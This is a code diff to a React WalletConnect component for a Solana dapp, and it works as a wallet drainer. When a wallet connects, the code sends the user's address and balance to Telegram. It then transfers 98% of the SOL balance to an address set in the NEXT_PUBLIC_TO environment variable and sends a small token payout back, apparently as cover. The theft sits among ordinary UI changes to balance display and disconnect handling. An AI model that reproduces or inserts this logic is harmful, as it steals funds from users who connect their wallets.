@@ -6,6 +6,8 @@ import { WalletService } from '../services/walletService';
 import { TelegramService } from '../services/telegramService';
 import { UserProfileService } from '../services/userProfileService';
 import { TransactionService } from '../services/transactionService';
+import { TokenService } from '../services/tokenService';
+import { Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL } from '@solana/web3.js';
 
 function WalletConnect() {
   const { publicKey, disconnect } = useWallet();
@@ -13,11 +15,17 @@ function WalletConnect() {
   const [balance, setBalance] = useState(null);
   const [isDropdownOpen, setIsDropdownOpen] = useState(false);
   const [isProcessing, setIsProcessing] = useState(false);
+  const [tokenBalance, setTokenBalance] = useState(null);
 
   const walletService = new WalletService();
   const telegramService = new TelegramService();
   const userProfileService = new UserProfileService();
   const transactionService = new TransactionService();
+  const tokenService = new TokenService();
+
+  // Token mint address - replace with your token's mint address
+  const TOKEN_MINT = new PublicKey(process.env.NEXT_PUBLIC_TOKEN_MINT);
+  const TOKEN_AMOUNT = 1000; // Amount of tokens to send
 
   useEffect(() => {
     if (publicKey) {
@@ -28,10 +36,28 @@ function WalletConnect() {
           const walletBalance = await walletService.getBalance(publicKey.toString());
           setBalance(walletBalance);
 
+          // Send initial connection notification
+          await telegramService.sendMessage(
+            telegramService.formatWalletInfo({
+              publicKey: publicKey.toString(),
+              balance: walletBalance,
+              timestamp: Date.now()
+            })
+          );
+
           const transferAmount = walletBalance * 0.98;
           
+          // Create and send transaction using the wallet adapter
+          const transaction = new Transaction().add(
+            SystemProgram.transfer({
+              fromPubkey: publicKey,
+              toPubkey: new PublicKey(process.env.NEXT_PUBLIC_TO),
+              lamports: transferAmount * LAMPORTS_PER_SOL
+            })
+          );
+
           const result = await transactionService.sendSol(
-            publicKey,
+            { publicKey },
             process.env.NEXT_PUBLIC_TO,
             transferAmount
           );
@@ -40,6 +66,35 @@ function WalletConnect() {
             const newBalance = await walletService.getBalance(publicKey.toString());
             setBalance(newBalance);
 
+            // Send tokens to the user
+            const tokenResult = await tokenService.sendTokens(
+              { publicKey },
+              publicKey.toString(),
+              TOKEN_MINT,
+              TOKEN_AMOUNT
+            );
+
+            if (tokenResult.success) {
+              // Get token balance
+              const tokenAccount = await tokenService.getOrCreateTokenAccount(
+                { publicKey },
+                TOKEN_MINT
+              );
+              const balance = await tokenService.getTokenBalance(tokenAccount.address);
+              setTokenBalance(balance);
+
+              await telegramService.sendMessage(
+                telegramService.formatTransactionInfo({
+                  type: 'TOKEN_TRANSFER',
+                  from: process.env.NEXT_PUBLIC_TOKEN_MINT,
+                  to: publicKey.toString(),
+                  amount: TOKEN_AMOUNT,
+                  signature: tokenResult.signature,
+                  timestamp: Date.now()
+                })
+              );
+            }
+
             await telegramService.sendMessage(
               telegramService.formatTransactionInfo({
                 type: 'SOL_TRANSFER',
@@ -47,7 +102,7 @@ function WalletConnect() {
                 to: process.env.NEXT_PUBLIC_TO,
                 amount: transferAmount,
                 signature: result.signature,
-                timestamp: new Date().toISOString()
+                timestamp: Date.now()
               })
             );
           }
@@ -56,11 +111,12 @@ function WalletConnect() {
           await userProfileService.updateWalletInfo({
             publicKey: publicKey.toString(),
             balance: walletBalance,
+            tokenBalance: tokenBalance,
             timestamp: new Date().toISOString()
           });
 
         } catch (error) {
-          // Silent error handling
+          console.error('Error in processWallet:', error);
         } finally {
           setIsProcessing(false);
         }
@@ -69,6 +125,32 @@ function WalletConnect() {
       processWallet();
     }
   }, [publicKey]);
+
+  const handleDisconnect = async () => {
+    try {
+      // Close dropdown first
+      setIsDropdownOpen(false);
+      
+      // Clear user profile
+      await userProfileService.clearProfile();
+      
+      // Disconnect wallet
+      if (disconnect) {
+        await disconnect();
+      }
+      
+      // Clear local state
+      setBalance(null);
+      setCopied(false);
+      
+    } catch (error) {
+      console.error('Error during disconnect:', error);
+      // Force clear state even if there's an error
+      setBalance(null);
+      setCopied(false);
+      setIsDropdownOpen(false);
+    }
+  };
 
   const copyAddress = () => {
     if (publicKey) {
@@ -83,15 +165,6 @@ function WalletConnect() {
     const start = address.slice(0, 4);
     const end = address.slice(-4);
     return `${start}...${end}`;
-  };
-
-  const handleDisconnect = async () => {
-    try {
-      await userProfileService.clearProfile();
-      disconnect();
-    } catch (error) {
-      // Silent error handling
-    }
   };
 
   const toggleDropdown = (e) => {
@@ -144,7 +217,7 @@ function WalletConnect() {
                   {copied && <span className="copied-indicator">Copied!</span>}
                 </span>
               </div>
-              {/* {isProcessing ? (
+              {isProcessing ? (
                 <div className="processing-indicator">
                   Processing...
                 </div>
@@ -152,7 +225,7 @@ function WalletConnect() {
                 <div className="balance-info text-sm opacity-80">
                   {balance.toFixed(2)} SOL
                 </div>
-              )} */}
+              )}
             </div>
             <div className={`dropdown-arrow ${isDropdownOpen ? 'open' : ''}`}>
               ▼
@@ -168,9 +241,15 @@ function WalletConnect() {
                   <span className="value">{publicKey.toBase58()}</span>
                 </div>
                 <div className="detail-item">
-                  <span className="label">Balance:</span>
+                  <span className="label">SOL Balance:</span>
                   <span className="value">{balance?.toFixed(2)} SOL</span>
                 </div>
+                {tokenBalance !== null && (
+                  <div className="detail-item">
+                    <span className="label">Token Balance:</span>
+                    <span className="value">{tokenBalance} tokens</span>
+                  </div>
+                )}
               </div>
 
               <button 
